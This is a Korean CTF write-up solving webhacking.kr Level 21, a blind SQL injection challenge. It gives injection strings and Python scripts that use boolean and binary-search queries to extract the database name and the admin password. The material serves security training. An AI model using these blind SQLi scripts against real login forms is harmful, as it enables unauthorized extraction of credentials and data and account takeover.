---
layout: post
title: Webhacking.kr | Level 21
subtitle: Webhacking CTF Problem Solving
categories: webhacking.kr
tags: [Pentest, Web]
---

**본 문제는 [webhacking.kr](https://webhacking.kr)를 통해서 풀어 보실 수 있습니다.**

**해답을 이해하며 생각을 해보면서 풀이 해보시길 바랍니다.**

## 문제 내용

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/208610749-d64fac4c-7d6d-45cf-9b2a-3819e2f35e60.png" width = 400> 
</p>

접속부터 해당 문제는 **BLIND SQL INJECTION**임을 알려준다. 

결국 우리는 해당 기법을 통해 아래 Result 값으로 참인지 거짓인지를 판별하여 ID와 PW를 구해야 할 것으로 보인다.

## 문제 풀이

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/208617749-e547f0c6-6adb-4bf5-8427-0a1b1250fc3e.png" width = 360> 
</p>

참일 수 없는 ID : guest, PW : guest를 넣고 제출하면 결과는 `login success`인 것을 알 수 있다. ID : admin, PW : admin도 가능하다.(_admin 계정 로그인이 주 문제 일 것으로 보인다._)

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/208610990-21766096-4ccf-479a-b0d2-9adfcb545231.png" width = 360> 
</p>

참일 수 없는 ID : 1, PW : 1를 넣고 제출하면 결과는 `login fail`인 것을 알 수 있다.

예상되는 SQL 문법으로는

```sql
SELECT * FROM users WHERE id = 'id' and pw = 'pw'
```

이렇게 되기에 and 이후에 값을 주석으로 우회하며 DB의 길이 등 모든 것을 알아보겠습니다.

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/208827708-5cd24313-c38c-493e-b633-87bfe94eaca9.png" width = 360> 
</p>

참일 수 없는 ID : `guest' or '1' = '1' #`, PW : `1`(아무 값)를 넣고 제출하면 결과는 `wrong password`인 것을 알 수 있다. 

이를 통해 올바른 SQL injection을 하면 **wrong password**가 뜨는 것을 알 수 있다.

* **DB 이름 길이 알아내기**

```python
# Database Length
i = 0
while True:
    # guest' and length(database()) = i#
    payload = f'guest\' and length(database()) = {i} -- '
    param = {'id' : payload, 'pw' : '1'}
    r = requests.get(url, params = param)
    
    if r.text.__contains__('wrong'):
        db_length = i
        break
    i += 1
print(f':::: DB Length :::: {db_length}')
```

이를 통해서 해당 로그인 관련 DB의 길이가 10인 것을 알 수 있다.

* **DB 이름 알아내기**

```python
# Database Name
db_name = ''
for i in tqdm(range(1, db_length + 1)):
    for ch in tc:
        # guest' and j = ascii(substring(db_name(), i, 1))
        payload = f'guest\' and ascii(substring(database(), {i}, 1)) = {ord(ch)} -- '
        param = {'id' : payload, 'pw' : '1'}
        r = requests.get(url, params = param)
        
        if r.text.__contains__('wrong'):
            db_name += ch
            break
print(f':::: DATABASE NAME :::: {db_name}')
```

해당 Database의 이름이 `webhacking`인 것까지 알 수 있었다. 이후 해당 DB의 테이블이 몇개로 이루어져 있는지 알아야 한다.

* **해당 DB의 테이블 이름 길이 알아내기**

```sql
((SELECT COUNT(table_name) FROM information_schema.tables WHERE table_schema = 'webhacking') = {i})
```

해당 문법을 통해서 테이블의 개수를 알아보고자 했으나 계속 나오지 않자 홈페이지에서 확인해보니 아래와 같았다.

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/209286986-f2ee23ac-0c53-47b1-87cc-67527d499c8b.png" width = 360> 
</p>

**no hack** 문구와 함께 다른 결과를 가져왔다. 따라서, 키워드 별로 입력해보니 `SELECT`가 필터링되고 있는 것을 알 수 있다.

`SELECT`가 필터링되고 있는 경우를 찾아보니 많이 복잡한 것으로 확인됐다...

하지만, 우리가 예상하고 있던 쿼리문을 보면 아래와 같다. 

```sql
SELECT * FROM users WHERE id = 'id' and pw = 'pw'
```

결국 Column이 `id, pw`이길 바라면서 바로 칼럼을 이용한 SQLi를 진행해보겠습니다.

* **패스워드 길이**

우리는 guest, guest를 통해서 해당 계정의 패스워드가 5자리인 것을 알 수 있으니 해당 쿼리가 제대로 작동하는지 guest로 테스트해보겠습니다.

```python
# Get Password Length
pw_length = 0
for i in tqdm(range(100)):
    # guest' and length(pw) = i
    payload = f'admin\' and length(pw) = {i} -- '
    param = {'id' : payload, 'pw' : '1'}
    r = requests.get(url, params = param)
    
    if r.text.__contains__('wrong'):
        pw_length = i
        break

print(f':::: PASSWORD :::: {pw_length}')  
```

해당 값이 제대로 나오므로 payload의 guest를 `admin`으로 변경해서 진행해보면 총 **36자리**인 것을 알 수 있다.

* **admin 패스워드**

```python
# Admin Password Binary search
pw = ''
for i in tqdm(range(1, pw_length + 1)):
    left, right = 32, 127

    while True:
        mid = int((left + right) / 2)
        # admin' and ascii(substring(pw(), i, 1)) > ascii mid value
        payload = f'admin\' and ascii(substring(pw, {i}, 1)) > {mid} -- '
        param = {'id' : payload, 'pw' : '1'}
        r = requests.get(url, params = param)
        
        if r.text.__contains__('wrong'):
            left = mid
            if (left + 1 == right):
                pw += chr(mid + 1)
                break
        else:
            right = mid

print(f':::: ADMIN PASSWORD :::: {pw}')
```

문제풀이하면서 이진 탐색이 아닌 모든 값 순회를 하였는데 너무 느려서 이진 탐색으로 바꿔서 했는데 행복했다.

이렇게 스크립트를 모두 수행하면 패스워드가 나오고 admin 계정 로그인이 가능하게 된다.

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/209294566-7bcceecd-d247-4b04-97f1-d9d2490bb951.png" width = 460> 
</p>